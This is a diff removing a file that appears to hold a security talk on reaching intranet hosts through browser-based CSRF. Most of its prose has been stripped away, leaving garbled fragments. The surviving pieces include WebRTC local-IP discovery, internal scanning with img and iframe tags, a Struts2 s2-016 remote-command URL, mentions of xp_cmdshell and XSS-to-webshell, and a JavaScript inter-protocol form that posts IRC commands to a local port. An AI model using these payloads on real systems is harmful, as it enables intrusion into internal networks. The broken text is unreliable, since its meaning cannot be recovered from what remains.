@@ -1,147 +1,0 @@
-
-5up3rh3i@gamil.com
-
-
-
-weibo@hi_heige twitter@80vul blog: http://hi.baidu.com/hi_heige http://zhuanlan.zhihu.com/heige site: http://www.80vul.com/
-
-WHAT
-
-
-"" " " ""... APT WTF
-
-WTF
- ""   
-
-CSRF ...
-
-CSRF
-CSRF  CSRF 
-
-Example
-
- 
-
-CSRF"" DNS
-
-""
-
-""
-
-CSRFTp-link
-CSRF
- Tplink web
-
-DEMO 
-
-
-CSRF  "" ""  .
-
-HOW
-
-i(ip)
-
-
-""WebRTC Local IP discovery with HTML5 WebRTC
-Local IP discovery with HTML5 WebRTC: Security and privacy risk?2013 by twitter.com/einaros
-
-WebRTC 
-
-
-
-http://www.webrtc.org/
-
-PCOS:windows OSxubuntu Yes OS
-android Yes iOS No
-
-IESafari 
-
-WebRTC
-IPPSChrome
-parallels Yes vmware fusion Yes Vbox No
-VPN
-
-ii
-URL
-URL http://192.168.1.102:80/phpcms_v9_UTF8/i nstall_package/index.php?m=admin&c=index
-
-IP  
-
-iiiCSRF
-tag
-GET <img><script><iframe> POST<from> AJAX
- 
-
-weibo.comip192.168.1.102http xmlhttp
-1GETPOST 2imgiframeip 3imgchrome
-
-
-
-""
-
- CSRF  Struts 2   s2-016
-http://host/struts2blank/example/X.action?action:%25{(new+java.lang.ProcessBuilder(new+ java.lang.String[]{'command','goes','here'})).start()}
-
-shell
-windows 
-ElasticSearch (CVE-2014-3120)
-json json hijacking 
-
-SQL
-SQLixp_cmdshell SQLiXSShtmlimg iframeCSRF
-xss
-mysql_error() XSSSQL
-
-Union Select 
-
-SQL(SQL) DNS( utl_http.request MSSQL:linkserver)
-
-
-
-XSS
-XSS iframe
-Web <iframe src=`http://192.168.1.102/bbs/forum.php?a=xss'>  ( webshell)
-XSS
-XSScsrf CSRFXSS
-
-WebShell  
-<script> +(json)
-
-iframe+"xss"  AjaxCross-Origin Resource Sharing
-
-
-
-Demopoc 
-
-WEB2.0
-
-xss 
-
-CSRF
-
-Inter-Protocol Communication
-http
-<script> gibson = document.createElement("form"); gibson.setAttribute("name","B"); gibson.setAttribute("target","A"); gibson.setAttribute("method","post"); gibson.setAttribute("action","http://127.0.0.1:6677"); gibson.setAttribute("enctype","multipart/from-data");
-crashoverride = document.createElement("textarea"); crashoverride.setAttribute("name","C");
-postdata = "USER A B C D \nNick xxxx\n"; crashoverride.setAttribute("value",postdata);
-crashoverride.innerText = postdata; crashoverride.innerHTML = postdata; gibson.appendChild(crashoverride); document.body.appendChild(gibson); gibson.submit(); </script>
-
-Inter-Protocol Communication2006Wade Alcorn  BeEF
-The Browser Hacker's Handbook
-2014 Wade Alcorn , Christian Frichot , Michele Orru
-
- 
-
-""
-The Browser Hacker's Handbook BeEFxss
-""
-One-Time Xss attack 2010vs One-Time Click attack
-""
-CSRFXSS ""
-
-
- 
-
-
-
-
